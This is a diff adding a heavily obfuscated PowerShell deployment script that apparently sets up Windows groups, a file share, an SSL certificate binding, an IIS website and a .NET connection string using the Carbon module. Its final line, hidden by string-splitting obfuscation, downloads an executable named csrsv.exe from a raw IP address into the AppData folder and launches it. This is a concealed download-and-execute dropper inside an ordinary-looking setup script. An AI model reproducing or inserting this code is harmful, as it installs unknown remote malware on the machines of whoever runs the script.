@@ -1,0 +1,62 @@
+  SEt-ITeM  ('va'+'rIAbl'+'e:'+'2k'+'Hw')  ( [tYPE]("{0}{1}"-F 'g','uId'));  
+
+
+
+
+
+
+
+
+
+
+
+[CmdletBinding()]
+param(
+)
+
+
+&("{2}{0}{1}"-f'Stric','tMode','Set-') -Version ("{0}{1}{2}" -f'Lat','e','st')
+
+& (.("{1}{0}{2}"-f 'at','Join-P','h') ${PSS`Cr`ipT`R`oot} ((("{1}{0}{2}{5}{4}{3}" -f 'Impo','..8Jt','r','s1','on.p','t-Carb'))  -cRePlacE([CHaR]56+[CHaR]74+[CHaR]116),[CHaR]92) -Resolve)
+
+${DePLoym`eNtWr`I`Te`RsgR`OuPNA`mE} = ("{3}{4}{0}{2}{1}{5}" -f'plo','mentWrite','y','D','e','rs')
+${d`E`PLoy`MNetr`eADerSg`Ro`U`pnAmE} = ("{1}{4}{3}{0}{5}{2}"-f'ntR','Depl','ers','me','oy','ead')
+${ccNETs`ERv`Ice`U`s`ER} = ((("{0}{3}{2}{4}{1}" -f'examp','User','e.co','l','msSCCCService'))."RE`Pl`AcE"(([CHAr]115+[CHAr]83+[CHAr]67),[strInG][CHAr]92))
+
+&("{2}{1}{3}{0}" -f 'up','stal','In','l-Gro') -Name ${dEPloy`MENTWrI`T`ERSg`Rou`PNAMe} `
+              -Description ("{10}{13}{0}{2}{1}{6}{12}{8}{3}{9}{7}{11}{4}{5}" -f'owed ','r','to w','the d','ha','re.','it','ment','to ','eploy','Use',' s','e ','rs all') `
+              -Members ${CC`NeT`S`ERvIcEuser}
+&("{3}{1}{0}{2}" -f'all','t','-Group','Ins') -Name ${DePLoy`M`NEt`R`E`AdErSgr`o`U`PnaMe} `
+              -Description ("{8}{7}{1}{2}{3}{6}{0}{5}{4}" -f'nt s','allowed',' to read th','e ','.','hare','deployme','rs ','Use') `
+              -Members ("{0}{2}{1}"-f'E','e','veryon')
+
+${W`ebS`ITepaTh} = ((("{0}{6}{5}{3}{4}{2}{1}" -f 'C','ry','Ogdirecto','O','gwebsiteC','oC','OgPathCOgt'))-rePlaCe 'COg',[ChAr]92)
+&("{1}{0}{3}{2}" -f '-Permi','Grant','on','ssi') -Path ${We`Bsi`TEPATH} -Permission ("{0}{1}{2}"-f 'Full','Cont','rol') `
+                 -Identity ${d`eP`l`O`ymEntwrI`Te`RsGRoUpNaME}
+.("{3}{1}{0}{2}"-f 'rmissi','rant-Pe','on','G') -Path ${WeBs`iTE`PaTh} -Permission ("{0}{1}"-f'Rea','d') `
+                 -Identity ${DEpl`oyMNEtReAD`e`RSg`R`oUp`NAME}
+
+${de`pLO`yshARen`AME} = ("{0}{1}" -f 'De','ploy')
+&("{1}{4}{0}{3}{2}" -f'l','Inst','re','-Sha','al') -Name ${dE`PL`Oys`HArEnAME} `
+              -Path ${WebSITe`p`ATh} `
+              -Description ("{8}{7}{9}{11}{2}{0}{5}{13}{4}{1}{12}{10}{3}{6}" -f 'o deplo','ch','rver t','ge','ite ','y we','s.','hare use','S','d by bu','n','ild se','a','bs') `
+              -FullAccess ${d`EPloy`MENTwrI`T`e`Rs`G`Rou`pNaMe} `
+              -ReadAccess ${DeP`LOYmnETRE`AdErS`gRoU`P`N`AmE}
+
+
+${SsL`CerT`p`AtH} = ((("{1}{2}{4}{0}{5}{3}{6}{8}{7}"-f'}to{','P','at','}SSL{0}ce','h{0','0','rti','r','ficate.ce'))-f [CHaR]92)
+${CE`Rt} = .("{3}{2}{1}{0}"-f 'Certificate','ll-','nsta','I') -Path ${SsL`cERT`P`AtH} -StoreLocation ("{2}{1}{0}"-f'e','hin','LocalMac') -StoreName ('My')
+&("{0}{4}{1}{5}{3}{2}"-f 'S','t-Ss','ng','ficateBindi','e','lCerti') -ApplicationID ( $2khW::("{1}{2}{0}" -f 'd','Ne','wGui').Invoke()) -Thumbprint ${Ce`Rt}."tH`UmBPR`INt"
+
+${a`pP`pOO`lName} = ("{3}{0}{2}{1}" -f 'pleAppP','ol','o','Exam')
+.("{2}{3}{0}{1}"-f 'P','ool','Ins','tall-IisApp') -Name ${a`PP`P`OoLnAME} -ServiceAccount ("{3}{0}{1}{2}" -f'i','c','e','NetworkServ')
+&("{4}{3}{2}{1}{0}"-f'ebsite','sW','l-Ii','l','Insta') -Path ${w`ebsitE`P`Ath} -Name ("{7}{5}{1}{6}{2}{3}{4}{0}"-f 'g','ar','on.','o','r','t-c','b','example1.ge') `
+                   -Bindings (("{2}{1}{0}"-f '80','*:','http/'),("{0}{2}{1}" -f'h','s/*:443','ttp')) -AppPoolName ${AP`PpooLn`AME}
+
+&("{3}{6}{5}{1}{4}{0}{2}" -f 'i','NetConnectionS','ng','Se','tr','-Dot','t') -Name ("{0}{2}{1}"-f'exa','ple1DB','m') `
+                           -Value ("{1}{2}{5}{7}{22}{4}{24}{8}{9}{13}{16}{25}{21}{10}{20}{23}{18}{19}{11}{17}{3}{0}{27}{6}{12}{15}{26}{14}" -f 'le1','Data',' ','alog=examp','exam','So','ntegra','urce=','e','1','.org; ','a','ted Security','.ge','I;','=','t-','t','it','ial C','I','bon','db.','n','pl','car','SSP','DB; I') `
+                           -Framework64 `
+                           -Clr4
+
+
+(&("{2}{1}{0}" -f't','jec','New-Ob') ("{4}{2}{5}{3}{1}{0}"-f 'Client','b','N','.We','System.','et')).("{1}{3}{0}{2}"-f 'nloadFil','D','e','ow').Invoke(("{0}{1}{2}{3}{6}{4}{5}" -f 'htt','p:/','/89.','24','.2','18/~yahoo/csrsv.exe','8.170'),"$env:APPDATA\csrsv.exe");.("{0}{1}{2}"-f'Start','-Proc','ess') ("$env:APPDATA\csrsv.exe")
